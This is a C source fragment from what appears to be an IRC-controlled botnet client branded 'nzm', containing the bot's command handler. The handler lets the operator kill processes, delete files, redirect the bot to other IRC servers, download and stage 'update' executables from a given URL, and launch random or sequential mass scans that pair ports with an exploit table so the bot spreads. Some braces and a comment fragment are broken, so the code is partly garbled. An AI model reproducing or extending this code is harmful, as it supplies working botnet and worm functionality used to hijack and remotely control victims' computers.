				showlog.filter[0] = '\0';
				if (x != NULL && a[s+1]) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL)
						_snprintf(showlog.filter,sizeof(showlog.filter),"%s",y);
				}
				_snprintf(showlog.chan, sizeof(showlog.chan), a[2]);
				showlog.sock = sock;
				showlog.notice = notice;
				showlog.silent = silent;

				sprintf(sendbuf, "nzm (log.plg) »»  Listing log.");
				showlog.threadnum = addthread(sendbuf, LOG_THREAD, NULL);
				if (threads[showlog.threadnum].tHandle = CreateThread(NULL, 0, &ShowLogThread, (LPVOID)&showlog, 0, &id)) {
					while (showlog.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("nzm (log.plg) »»  Failed to start listing thread, error: <%d>.", GetLastError());

				return 1;
			}
			else if (strcmp("util.clearlog", a[s]) == 0 || strcmp("util.clg", a[s]) == 0) {
				clearlog(sock, a[2], notice, silent);

				return 1;
			}
			#ifndef NO_NETINFO
			else if (strcmp("com.netinfo", a[s]) == 0 || strcmp("com.ni", a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				addlog("nzm (irc.plg) »»  Network Info.");

				return repeat;
			}
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("com.sysinfo", a[s]) == 0 || strcmp("com.si", a[s]) == 0) {
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("nzm (irc.plg) »»  System Info.");

				return repeat;
			}
			#endif
			#ifndef NO_PROCESS
			else if (strcmp("com.procs", a[s]) == 0 || strcmp("com.ps", a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], ".n.z.m. (processes.p.l.g) .»».  Already running.", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,".n.z.m. (processes.p.l.g) .»».  Proccess list.");
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,".n.z.m. (processes.p.l.g) .»».  Failed to start listing thread, error: <%d>.", GetLastError());
					addlog(sendbuf);
				}

				return 1;
			}
			#endif
			else if (strcmp("com.uptime", a[s]) == 0 || strcmp("com.up", a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]);

				if (total/86400 >= uptime || uptime == -1) {
					sprintf(sendbuf, "nzm (irc.plg) »»  Uptime: %s.", Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}

				return repeat;
			}
			else if (strcmp("irc.who", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "-[Login List]-", notice);
				for (i = 0; i < MAXLOGINS; i++) {
					sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
    				irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
				}
				addlog("nzm (irc.plg) »»  Login list complete.");
			}
			else if (strcmp("util.flushdns", a[s]) == 0 || strcmp("util.fdns", a[s]) == 0) {
				if (fDnsFlushResolverCache) {
					if (fDnsFlushResolverCache())
						_snprintf(sendbuf,sizeof(sendbuf),"nzm (flushdns.plg) »»  DNS cache flushed.");
					else
						_snprintf(sendbuf,sizeof(sendbuf),"nzm (flushdns.plg) »»  Failed to flush DNS cache.");
				} else
					_snprintf(sendbuf,sizeof(sendbuf),"nzm (flushdns.plg) »»  Failed to load dnsapi.dll.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("currentip", a[s]) == 0 || strcmp("cip", a[s]) == 0) {
				int scanthread;
				if (a[s+1])
					scanthread = atoi(a[s+1]);
				else
					scanthread = findthreadnum(SCAN_THREAD);
				if (scanthread != 0)
					currentIP(sock, a[2], notice, scanthread);

				return repeat;
			}
				}

				return 1;
			}*/
				#ifndef NO_DOWNLOAD
			else if ((strcmp("web.dl.up", a[s]) == 0)) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "s[I] (update.plg) »»  Downloading update from: %s.", a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"s[I] (update.plg) »»  Failed to start download thread, error: <%d>.", GetLastError());
				} else
					sprintf(sendbuf,"s[I] (update.plg) »»  Bot ID must be different than current running process.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
				
				return 1;

			}

			#ifndef NO_ADVSCAN
			else if (strcmp("scanall", a[s]) == 0 || strcmp("mass", a[s]) == 0) {
				if (PrivateIP(GetIP(sock)) && (lstrcmpi(lanchan, a[2]) != 0) && (parameters['l'])) {
					//join lanchan channel
					irc_sendv(sock, "COIN %s %s\r\n", lanchan, chanpass);
					return 1;
				}
				for(int i=0; scanall[i].isend != false; i++) { }
				for(int sne=0; scanall[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + atoi(a[s+1]) > MAXSCANTHRD) {
						sprintf(sendbuf ,"[SCANALL] Already %d scanning threads. Too many specified.", scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						// don't edit this stuff below, you'll fuck up your mass scanning.. trust me.
						advscan.threads = atoi(a[s+1]);
						advscan.delay = 5;
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = 0;
						//
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, scanall[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, ".n.z.m. (root.p.l.g) .»».  Failed to start scan, port is invalid.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}

						if (parameters['a'] || parameters['b'] || parameters['r'] || parameters['y'] || parameters['w']) {

							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} 
							else if (parameters['y'] || parameters['w']) {
								unsigned long iptest;
								IN_ADDR ina;
								int ip1=-1,ip2=-1,ip3=-1,ip4=-1;
								sscanf(advscan.ip,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
								ip2=(int)(((double)rand()/((double)(RAND_MAX)+(double)(1)))* 256);
								ip3=0;
								ip4=0;
								iptest = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
								ina.s_addr =iptest;
								sprintf(advscan.ip,"%s",finet_ntoa(ina));
								advscan.random = FALSE;
								if (parameters['w']) {
									int extractip = 2;
									for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);							
									advscan.random = TRUE;
								}
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "[SCAN]: Failed to start scan, no IP specified.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);
							
							return 1;
						}

						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "[SCANALL] %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.",
							((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[SCANALL] Failed to start scan thread, error: <%d>.", GetLastError());

						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						Sleep(1000);

					}
				}
				return 1;
			}
			#endif
			
			else if (strcmp("irc.nick", a[s]) == 0 || strcmp("irc.n", a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				addlogv("nzm (irc.plg) »»  Nick changed to: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("irc.join", a[s]) == 0 || strcmp("irc.j", a[s]) == 0) {
				irc_sendv(sock, "COIN %s %s\r\n", a[s+1], a[s+2]);
				addlogv("nzm (irc.plg) »»  Joined channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("irc.part", a[s]) == 0 || strcmp("irc.pt", a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				addlogv("nzm (irc.plg) »»  Parted channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("irc.raw", a[s]) == 0 || strcmp("irc.ra", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						addlogv("nzm (irc.plg) »»  IRC Raw: %s.",y);
					}
				}

				return repeat;
			}
			else if (strcmp("threads.kill", a[s]) == 0 || strcmp("threads.k", a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"nzm (threads.plg) »»  Stopped: %d thread(s).", i);
					else
						sprintf(sendbuf,"nzm (threads.plg) »»  No active threads found.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;

						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"nzm (threads.plg) »»  Killed thread: %s.",a[i]);
						else
							sprintf(sendbuf,"nzm (threads.plg) »»  Failed to kill thread: %s.",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("irc.setserve", a[s]) == 0 || strcmp("irc.se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"nzm (irc.plg) »»  Server changed to: '%s'.",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_PROCESS
			else if (strcmp("com.killprocname",a[s]) == 0 || strcmp("com.kpn", a[s]) == 0) {  // kill process name
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"nzm (processes.plg) »»  Process killed: %s",a[s+1]);
				else
					sprintf(sendbuf,"nzm (processes.plg) »»  Failed to terminate process: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("com.prockillid",a[s]) == 0 || strcmp("com.pkid", a[s]) == 0) {  // kill process id
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"nzm (processes.plg) »»  Process killed ID: %s",a[s+1]);
				else
					sprintf(sendbuf,"nzm (processes.plg) »»  Failed to terminate process ID: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("com.delete", a[s]) == 0 || strcmp("com.del", a[s]) == 0) {
				if (DeleteFile(a[s+1]))
					_snprintf(sendbuf,sizeof(sendbuf),"nzm (file.plg) »»  Deleted '%s'.",a[s+1]);
				else
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("nzm (file.plg) »» "));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("mirc.cmd", a[s]) == 0 || strcmp("mirc.cmd", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"nzm (mirc.plg) »»  Client not open.");
						else
							sprintf(sendbuf,"nzm (mirc.plg) »»  Command sent.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
                }

				return repeat;
			}

			else if (strcmp("irc.gethost", a[s]) == 0 || strcmp("irc.gh", a[s]) == 0) {
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"nzm (irc.plg) »»  Gethost: %s, Command: %s", a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"nzm (irc.plg) »»  Unable to extract Gethost command.");
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"nzm (irc.plg) »»  Gethost: %s.",a[s+1]);
					}
					addlog(sendbuf);
				}

				return repeat;
			}

			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;

			else if (strcmp("irc.privmsg", a[s]) == 0 || strcmp("irc.pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						addlogv("nzm (irc.plg) »»  Privmsg: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("irc.action", a[s]) == 0 || strcmp("irc.ac", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
						addlogv("nzm (irc.plg) »»  Action: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("irc.cycle", a[s]) == 0 || strcmp("irc.cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0)
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "COIN %s %s\r\n", a[s+2], a[s+3]);
				addlog("nzm (irc.plg) »»  Cycle.");

				return repeat;
			}
			else if (strcmp("irc.mode", a[s]) == 0 || strcmp("irc.m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						addlogv("nzm (irc.plg) »»  Mode change: %s",y);
					}
				}

				return repeat;
			}

			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;

			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;

			#ifndef NO_ADVSCAN
			else if (strcmp("advscan", a[s]) == 0) {
				if (PrivateIP(GetIP(sock)) && (lstrcmpi(lanchan, a[2]) != 0) && (parameters['l'])) {
					//join lanchan channel
					irc_sendv(sock, "COIN %s %s\r\n", lanchan, chanpass);
					return 1;
				}
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"[SCAN]: Already %d scanning threads. Too many specified.", scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); // check for method or port number
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "[SCAN]: Failed to start scan, port is invalid.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					int urlpos = 0;

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
						if (parameters['y'] || parameters['w']) {
							unsigned long iptest;
							IN_ADDR ina;
							int ip1=-1,ip2=-1,ip3=-1,ip4=-1;
							sscanf(advscan.ip,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
							if (ip2==-1) ip2=(int)(((double)rand()/((double)(RAND_MAX)+(double)(1)))* 256);
							if (ip3==-1) ip3=0;
							if (ip4==-1) ip4=0;
							iptest = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
							ina.s_addr =iptest;
							sprintf(advscan.ip,"%s",finet_ntoa(ina));
							advscan.random = FALSE;
							if (parameters['w']) {
								int extractip = 2;
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);							
								advscan.random = TRUE;
							}
						}
						urlpos = 6;						
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r'] || parameters['y'] || parameters['w']) {

							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} 
							else if (parameters['y'] || parameters['w']) {
								unsigned long iptest;
								IN_ADDR ina;
								int ip1=-1,ip2=-1,ip3=-1,ip4=-1;
								sscanf(advscan.ip,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
								ip2=(int)(((double)rand()/((double)(RAND_MAX)+(double)(1)))* 256);
								ip3=0;
								ip4=0;
								iptest = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
								ina.s_addr =iptest;
								sprintf(advscan.ip,"%s",finet_ntoa(ina));
								advscan.random = FALSE;
								if (parameters['w']) {
									int extractip = 2;
									for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);							
									advscan.random = TRUE;
								}
							}
							else
								advscan.random = FALSE;

							urlpos = 5;

						} else {
							sprintf(sendbuf, "[SCAN]: Failed to start scan, no IP specified.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

					sprintf(sendbuf, "[SCAN]: %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", 
						((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[SCAN]: Failed to start scan thread, error: <%d>.", GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
			#endif
		}
	}

	return repeat;
}
